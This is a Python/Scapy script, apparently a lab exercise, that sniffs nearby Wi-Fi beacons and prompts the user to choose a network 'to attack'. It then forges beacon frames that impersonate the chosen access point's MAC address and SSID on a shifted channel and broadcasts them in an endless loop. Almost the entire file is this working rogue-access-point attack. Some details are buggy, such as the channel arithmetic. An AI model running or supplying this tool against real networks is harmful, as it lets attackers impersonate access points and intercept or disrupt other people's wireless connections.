#!/usr/bin/env python

# sources: 
# https://gist.github.com/securitytube/5291959
# https://pythontips.com/2018/09/08/sending-sniffing-wlan-beacon-frames-using-scapy/?utm_campaign=News&utm_medium=Community&utm_source=DataCamp.com
# https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
# https://scapy.readthedocs.io/en/latest/usage.html
# https://stackoverflow.com/questions/56644291/trying-to-retrieve-channel-from-802-11-frame-with-scapy
# https://www.thepythoncode.com/article/create-fake-access-points-scapy

from scapy.all import *
import os

pkt_list = []
invalid = True
counter = -1
input_id = -1
chan = 0
interface = "wlan0mon"

def PacketHandler(pkt) :
	global counter
	global channel
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 8 :
			if pkt not in pkt_list :
				pkt_list.append(pkt)
				counter += 1
				chan = pkt[Dot11Beacon].network_stats().get("channel")
				print "ID: %d - AP MAC: %s with SSID: %s On channel: %d  With Power: %d nBm" %(counter, pkt.addr2, pkt.info, chan, pkt.dBm_AntSignal)

# we start sniffing packets on interface wlan0mon, it must first be activated with sudo airmon-ng start wlan0
sniff(iface=interface, prn = PacketHandler, count=100)

# asking the user wich network to attack
while invalid:
	print("Please select which network to attack by their id:")
	
	# user input
	input_id = raw_input("Network id: ")

	if not input_id.isdigit():
		continue

	input_id = int(input_id)

	if input_id < 0 or input_id > len(pkt_list)-1:
		print("Invalid id")
	else:
		invalid = False
	
# we define a new variable which is the target the user chose to attack
target = pkt_list[input_id]

# the beacon will be 6 channels appart from the original one
chan = target[Dot11Beacon].network_stats().get("channel") + 6 % 14

# sender mac is the access point mac to mimick it
sender_mac = target.addr2

# we retrieve the name of the access point
ssid = target.info

# 802.11 frame template, we want to broadcast it since we're mocking an AP
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)

# beacon layer
beacon = Dot11Beacon(cap='ESS+privacy')

# putting ssid in the frame
essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

# we could use this prepared rsn or the one taken from the packet
rsn = Dot11Elt(ID='RSNinfo', info=(
	'\x01\x00'                 #RSN Version 1
	'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
	'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
	'\x00\x0f\xac\x04'         #AES Cipher
	'\x00\x0f\xac\x02'         #TKIP Cipher
	'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
	'\x00\x0f\xac\x02'         #Pre-Shared Key
	'\x00\x00'))               #RSN Capabilities (no extra capabilities)

# stack all the layers and add a RadioTap so we forge a new frame on the new channel
# originaly it's supposed to be this but it's not precise enough so we build on the target packet and modify the channels and tell we are the AP
# frame = RadioTap()/dot11/beacon/essid/rsn/Dot11Elt(ID="DSset", info=chr(chan))
frame = target/Dot11Elt(ID="DSset", info=chr(chan))/essid/dot11

# frame.show()

# switching channel on the interface
print "New channel is %d" %(chan)

print "Press CTRL+C to stop sending beacons: "
sendp(frame, iface=interface, inter=0.1, loop=1)
print "Exiting..."
